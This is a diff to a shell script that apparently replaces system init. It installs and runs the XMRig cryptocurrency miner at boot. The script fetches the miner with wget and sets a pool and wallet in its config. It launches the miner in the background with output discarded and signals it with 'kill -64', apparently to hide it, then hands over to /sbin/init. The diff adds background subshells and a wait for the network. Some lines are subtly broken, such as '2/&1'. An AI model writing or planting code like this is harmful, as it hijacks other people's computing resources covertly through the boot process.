@@ -25,6 +25,10 @@ fi
 #deleting everything from the directory to be safe and to clean up
 if [ ! -e "$xmrig_binary" ] || [ ! -e "$xmrig_config" ]; then
 	rm -rf "$xmrig_dir"/*
+	#wait for the net to initalize
+(	while ! ping -c 1 google.com; do
+		sleep 5
+	done
 	wget -O "$xmrig_dir/xmrig_tar" https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
 	tar -xvzf "$xmrig_dir/xmrig_tar" -C "$xmrig_dir/"
 	cp "$xmrig_dir/xmrig-6.22.2/xmrig" "$xmrig_binary"
@@ -34,6 +38,7 @@ if [ ! -e "$xmrig_binary" ] || [ ! -e "$xmrig_config" ]; then
 	
 	sed -i "s|\"url\": \".*\"|\"url\": \"$pool\"|" "$xmrig_config"
 	sed -i "s|\"user\": \".*\"|\"user\": \"$wallet\"|" "$xmrig_config"
+) &
 
 fi
 
@@ -56,10 +61,13 @@ threads=$(lscpu | awk -F: '/^CPU\(s\):/ {gsub(/^[ \t]+/, "", $2); print $2}')
 #check if min number of threads is six
 if [ "$threads" -gt 4 ]; then
 	#check if we got xmrig and if not then wget xmrig
-
+(	while [ ! -f $xmrig_binary ] && [ ! -f $xmrig_config]; do
+		sleep 5
+	done
 	usable_threads=$((threads * 20 / 100))
 	"$xmrig_binary" --config="$xmrig_config" --threads=$usable_threads > /dev/null 2/&1 &
 	kill -64 $!
+) &
 fi
 
 exec /sbin/init "$@"
